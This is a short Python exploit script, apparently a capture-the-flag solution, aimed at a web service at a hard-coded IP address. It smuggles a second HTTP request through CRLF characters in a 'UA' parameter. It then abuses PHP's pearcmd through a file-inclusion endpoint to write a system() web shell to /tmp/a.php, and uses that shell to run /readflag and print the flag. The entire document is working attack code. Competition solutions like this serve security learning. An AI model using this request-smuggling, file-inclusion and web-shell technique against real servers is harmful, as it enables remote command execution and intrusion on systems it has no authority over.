import requests

url = 'http://34.124.157.127:5005/'

def up_shell():
    # save in /tmp/a.php
    params = {"UA":"\r\n\r\nGET /lib.php?+config-create+/&f=/usr/local/lib/php/pearcmd&/<?=system($_GET[0])?>+/tmp/a.php HTTP/1.0\r\nConnection: close\r\n\r\n"}
    r = requests.get(url, params=params)
    print("Done")

def getFlag():
    params = {"UA":"\r\n\r\nGET /lib.php?f=/tmp/a&0=/readflag HTTP/1.0\r\nConnection: close\r\n\r\n"}
    r = requests.get(url, params=params)
    flag = (r.text).split('ISITDTU{')[1]
    return "ISITDTU{"+flag

if __name__ == '__main__':
    print("Uploading webshell...")
    up_shell()
    print("Flag: ",getFlag())
    
